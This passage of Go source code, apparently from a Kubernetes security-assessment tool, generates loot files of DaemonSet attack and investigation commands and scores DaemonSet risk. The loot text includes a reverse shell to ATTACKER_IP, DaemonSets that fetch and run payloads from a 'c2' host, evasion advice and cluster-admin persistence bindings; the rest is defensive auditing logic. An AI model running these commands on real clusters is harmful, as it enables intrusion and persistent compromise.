	exploitLines = append(exploitLines, "    metadata:")
	exploitLines = append(exploitLines, "      labels:")
	exploitLines = append(exploitLines, "        name: log-collector")
	exploitLines = append(exploitLines, "    spec:")
	exploitLines = append(exploitLines, "      containers:")
	exploitLines = append(exploitLines, "      - name: collector")
	exploitLines = append(exploitLines, "        image: alpine:latest")
	exploitLines = append(exploitLines, "        command: [\"/bin/sh\", \"-c\"]")
	exploitLines = append(exploitLines, "        args: [\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"]")
	exploitLines = append(exploitLines, "EOF\n")

	exploitLines = append(exploitLines, "\n=== PERSISTENCE ===\n")
	exploitLines = append(exploitLines, "# 4. Modify existing DaemonSet for persistence")
	exploitLines = append(exploitLines, "kubectl patch daemonset <name> -n <namespace> --type=json -p='[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/0/command\", \"value\": [\"/bin/sh\", \"-c\", \"curl http://c2/beacon; sleep 3600\"]}]'\n")

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "DaemonSet-Exploitation",
		Contents: strings.Join(exploitLines, "\n"),
	})

	// 4. DaemonSet-Persistence: Persistence mechanisms
	var persistLines []string
	persistLines = append(persistLines, "########################################")
	persistLines = append(persistLines, "##### DaemonSet Persistence Mechanisms")
	persistLines = append(persistLines, "########################################\n")

	persistLines = append(persistLines, "=== WHY DAEMONSETS FOR PERSISTENCE? ===\n")
	persistLines = append(persistLines, "# DaemonSets provide:")
	persistLines = append(persistLines, "# - Automatic deployment to ALL nodes (including new nodes)")
	persistLines = append(persistLines, "# - Automatic restart if pods are deleted")
	persistLines = append(persistLines, "# - Cluster-wide coverage")
	persistLines = append(persistLines, "# - Often overlooked by defenders\n")

	persistLines = append(persistLines, "=== DETECTION EVASION ===\n")
	persistLines = append(persistLines, "# 1. Hide in kube-system namespace with legitimate-sounding names")
	persistLines = append(persistLines, "kubectl create daemonset kube-proxy-monitor -n kube-system --image=alpine -- sh -c 'curl http://c2/beacon'\n")

	persistLines = append(persistLines, "# 2. Use NodeSelector to target specific nodes")
	persistLines = append(persistLines, "cat <<EOF | kubectl apply -f -")
	persistLines = append(persistLines, "apiVersion: apps/v1")
	persistLines = append(persistLines, "kind: DaemonSet")
	persistLines = append(persistLines, "metadata:")
	persistLines = append(persistLines, "  name: gpu-monitor")
	persistLines = append(persistLines, "  namespace: kube-system")
	persistLines = append(persistLines, "spec:")
	persistLines = append(persistLines, "  selector:")
	persistLines = append(persistLines, "    matchLabels:")
	persistLines = append(persistLines, "      name: gpu-monitor")
	persistLines = append(persistLines, "  template:")
	persistLines = append(persistLines, "    metadata:")
	persistLines = append(persistLines, "      labels:")
	persistLines = append(persistLines, "        name: gpu-monitor")
	persistLines = append(persistLines, "    spec:")
	persistLines = append(persistLines, "      nodeSelector:")
	persistLines = append(persistLines, "        node-role.kubernetes.io/worker: \"\"")
	persistLines = append(persistLines, "      containers:")
	persistLines = append(persistLines, "      - name: monitor")
	persistLines = append(persistLines, "        image: alpine:latest")
	persistLines = append(persistLines, "        command: [\"sh\", \"-c\", \"wget http://c2/payload | sh\"]")
	persistLines = append(persistLines, "EOF\n")

	persistLines = append(persistLines, "# 3. Low resource requests to avoid detection")
	persistLines = append(persistLines, "# Set minimal CPU/memory requests so DaemonSet appears benign\n")

	persistLines = append(persistLines, "\n=== RBAC-BASED PERSISTENCE ===\n")
	persistLines = append(persistLines, "# 1. Create ServiceAccount with cluster-admin for DaemonSet")
	persistLines = append(persistLines, "kubectl create sa persistence-sa -n kube-system")
	persistLines = append(persistLines, "kubectl create clusterrolebinding persistence-admin --clusterrole=cluster-admin --serviceaccount=kube-system:persistence-sa\n")

	persistLines = append(persistLines, "# 2. Use privileged SA in DaemonSet")
	persistLines = append(persistLines, "# This ensures the DaemonSet can access cluster resources\n")

	persistLines = append(persistLines, "\n=== NODE-LEVEL PERSISTENCE ===\n")
	persistLines = append(persistLines, "# 1. Write to /etc/crontab on host via hostPath mount")
	persistLines = append(persistLines, "# DaemonSet with hostPath mount to /etc can modify crontab")
	persistLines = append(persistLines, "# This survives pod deletion\n")

	persistLines = append(persistLines, "# 2. Modify systemd services on host")
	persistLines = append(persistLines, "# With hostPath mount to /etc/systemd/system\n")

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "DaemonSet-Persistence",
		Contents: strings.Join(persistLines, "\n"),
	})

	// 5. DaemonSet-Commands: Investigation commands
	var cmdLines []string
	cmdLines = append(cmdLines, "########################################")
	cmdLines = append(cmdLines, "##### DaemonSet Investigation Commands")
	cmdLines = append(cmdLines, "########################################\n")

	cmdLines = append(cmdLines, "=== DAEMONSET ANALYSIS ===\n")
	cmdLines = append(cmdLines, "# List all daemonsets with their node counts")
	cmdLines = append(cmdLines, "kubectl get daemonsets -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,DESIRED:.status.desiredNumberScheduled,CURRENT:.status.currentNumberScheduled,READY:.status.numberReady,NODE-SELECTOR:.spec.template.spec.nodeSelector\n")

	cmdLines = append(cmdLines, "# Find privileged daemonsets")
	cmdLines = append(cmdLines, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.containers[]?.securityContext?.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n")

	cmdLines = append(cmdLines, "# Find daemonsets with hostPID/hostIPC/hostNetwork")
	cmdLines = append(cmdLines, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.hostPID == true or .spec.template.spec.hostIPC == true or .spec.template.spec.hostNetwork == true) | \"\\(.metadata.namespace)/\\(.metadata.name) - hostPID:\\(.spec.template.spec.hostPID) hostIPC:\\(.spec.template.spec.hostIPC) hostNetwork:\\(.spec.template.spec.hostNetwork)\"'\n")

	cmdLines = append(cmdLines, "# Find daemonsets with hostPath volumes")
	cmdLines = append(cmdLines, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.volumes[]?.hostPath != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n")

	cmdLines = append(cmdLines, "# Find daemonsets with dangerous capabilities")
	cmdLines = append(cmdLines, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.containers[]?.securityContext?.capabilities?.add != null) | \"\\(.metadata.namespace)/\\(.metadata.name): \\([.spec.template.spec.containers[]?.securityContext?.capabilities?.add] | flatten | unique)\"'\n")

	cmdLines = append(cmdLines, "\n=== NODE ANALYSIS ===\n")
	cmdLines = append(cmdLines, "# List which nodes each daemonset is running on")
	cmdLines = append(cmdLines, "kubectl get pods -A -o wide | grep -E 'NAMESPACE|daemonset'\n")

	cmdLines = append(cmdLines, "# Get logs from daemonset pods on specific node")
	cmdLines = append(cmdLines, "kubectl logs -n <namespace> -l app=<daemonset-name> --field-selector spec.nodeName=<node-name>\n")

	cmdLines = append(cmdLines, "\n=== SPECIFIC DAEMONSET INVESTIGATIONS ===\n")

	for _, f := range append(critical, high...) {
		cmdLines = append(cmdLines, fmt.Sprintf("\n# %s/%s (Risk: %s, Nodes: %d)", f.Namespace, f.Name, f.RiskLevel, f.CurrentNodes))
		cmdLines = append(cmdLines, fmt.Sprintf("kubectl get daemonset -n %s %s -o yaml", f.Namespace, f.Name))
		cmdLines = append(cmdLines, fmt.Sprintf("kubectl get pods -n %s -l app=%s -o wide", f.Namespace, f.Name))
		cmdLines = append(cmdLines, fmt.Sprintf("kubectl describe daemonset -n %s %s", f.Namespace, f.Name))

		if len(f.BackdoorPatterns) > 0 {
			cmdLines = append(cmdLines, fmt.Sprintf("# THREAT: %s", strings.Join(f.BackdoorPatterns, ", ")))
		}
	}

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "DaemonSet-Commands",
		Contents: strings.Join(cmdLines, "\n"),
	})

	return lootFiles
}

// calculateDaemonSetRiskScore calculates a numeric risk score (0-100)
func calculateDaemonSetRiskScore(finding DaemonSetFinding) int {
	score := 0

	// Backdoors and malicious activity (50 points max)
	if len(finding.ReverseShells) > 0 {
		score += 50
	}
	if len(finding.CryptoMiners) > 0 {
		score += 50
	}
	if len(finding.DataExfiltration) > 0 {
		score += 30
	}
	if len(finding.ContainerEscape) > 0 {
		score += 40
	}
	if len(finding.NodeCompromise) > 0 {
		score += 35
	}

	// Privileged access (30 points max)
	if finding.Privileged {
		score += 25
	}
	if finding.HostPID {
		score += 15
	}
	if finding.HostIPC {
		score += 10
	}
	if finding.HostNetwork {
		score += 15
	}

	// Dangerous hostPaths (20 points max)
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			score += 20
			break
		} else if hp == "/" || hp == "/:" {
			score += 15
			break
		} else {
			score += 5
		}
	}

	// Dangerous capabilities (15 points max)
	dangerousCaps := []string{"SYS_ADMIN", "SYS_MODULE", "SYS_RAWIO", "SYS_PTRACE", "DAC_READ_SEARCH", "NET_ADMIN"}
	for _, cap := range finding.Capabilities {
		for _, dangerousCap := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				score += 5
				break
			}
		}
	}

	// Wide deployment (10 points max)
	if finding.DesiredNodes > 50 {
		score += 10
	} else if finding.DesiredNodes > 20 {
		score += 7
	} else if finding.DesiredNodes > 10 {
		score += 5
	}

	// Run as root (10 points)
	if finding.RunAsUser == "0" || finding.RunAsUser == "" {
		score += 10
	}

	// Cloud role with high privileges (10 points)
	if finding.CloudRole != "" && (strings.Contains(strings.ToLower(finding.CloudRole), "admin") ||
		strings.Contains(strings.ToLower(finding.CloudRole), "cluster")) {
		score += 10
	}

	// Cap at 100
	if score > 100 {
		score = 100
	}

	return score
}

// generateDaemonSetSecurityIssues creates a list of specific security issues and recommendations
func generateDaemonSetSecurityIssues(finding DaemonSetFinding) []string {
	var issues []string

	// Critical malicious activity
	if len(finding.ReverseShells) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Reverse shell patterns detected: %s - immediate investigation required", strings.Join(finding.ReverseShells, ", ")))
	}
	if len(finding.CryptoMiners) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Crypto mining patterns detected: %s - resource abuse on all nodes", strings.Join(finding.CryptoMiners, ", ")))
	}
	if len(finding.DataExfiltration) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Data exfiltration patterns: %s - audit network traffic", strings.Join(finding.DataExfiltration, ", ")))
	}
	if len(finding.ContainerEscape) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Container escape techniques detected: %s - cluster-wide compromise risk", strings.Join(finding.ContainerEscape, ", ")))
	}
	if len(finding.NodeCompromise) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Node compromise patterns: %s - all %d nodes at risk", strings.Join(finding.NodeCompromise, ", "), finding.DesiredNodes))
	}

	// Privileged access
	if finding.Privileged {
		issues = append(issues, fmt.Sprintf("HIGH: Privileged DaemonSet running on %d nodes - kernel access on all nodes", finding.DesiredNodes))
	}
	if finding.HostPID {
		issues = append(issues, "HIGH: hostPID enabled - can view/kill all node processes")
	}
	if finding.HostIPC {
		issues = append(issues, "MEDIUM: hostIPC enabled - can access inter-process communication on nodes")
	}
	if finding.HostNetwork {
		issues = append(issues, "MEDIUM: hostNetwork enabled - can sniff network traffic on all nodes")
	}

	// Dangerous hostPath mounts
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			issues = append(issues, fmt.Sprintf("CRITICAL: Container runtime socket mounted (%s) - cluster admin access", hp))
		} else if hp == "/" || hp == "/:" {
			issues = append(issues, "CRITICAL: Root filesystem mounted - complete node compromise")
		} else if strings.Contains(hp, "/var/run") {
			issues = append(issues, fmt.Sprintf("HIGH: Sensitive path mounted: %s", hp))
		} else {
			issues = append(issues, fmt.Sprintf("MEDIUM: HostPath volume: %s", hp))
		}
	}

	// Dangerous capabilities
	dangerousCaps := map[string]string{
		"SYS_ADMIN":        "full system administration",
		"SYS_MODULE":       "kernel module loading",
		"SYS_RAWIO":        "direct hardware access",
		"SYS_PTRACE":       "process debugging/injection",
		"DAC_READ_SEARCH":  "bypass file read permissions",
		"NET_ADMIN":        "network configuration control",
		"SYS_BOOT":         "system reboot capability",
		"SYS_TIME":         "system time manipulation",
	}

	for _, cap := range finding.Capabilities {
		for dangerousCap, desc := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				issues = append(issues, fmt.Sprintf("HIGH: Dangerous capability %s - enables %s", dangerousCap, desc))
			}
		}
	}

	// RunAsUser check
	if finding.RunAsUser == "0" || finding.RunAsUser == "" {
		issues = append(issues, "MEDIUM: Running as root (UID 0) - should use non-root user")
	}

	// Wide deployment
	if finding.DesiredNodes > 50 {
		issues = append(issues, fmt.Sprintf("MEDIUM: DaemonSet on %d nodes - large attack surface", finding.DesiredNodes))
	}

	// Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			issues = append(issues, fmt.Sprintf("HIGH: Cloud admin role assigned: %s - review IAM permissions", finding.CloudRole))
		} else {
			issues = append(issues, fmt.Sprintf("LOW: Cloud IAM role: %s - verify least privilege", finding.CloudRole))
		}
	}

	// Service account
	if finding.ServiceAccount == "default" {
		issues = append(issues, "LOW: Using default service account - should use dedicated ServiceAccount with minimal RBAC")
	}

	// No issues found
	if len(issues) == 0 {
		issues = append(issues, "LOW: Standard DaemonSet configuration - no obvious security issues")
	}

	return issues
}
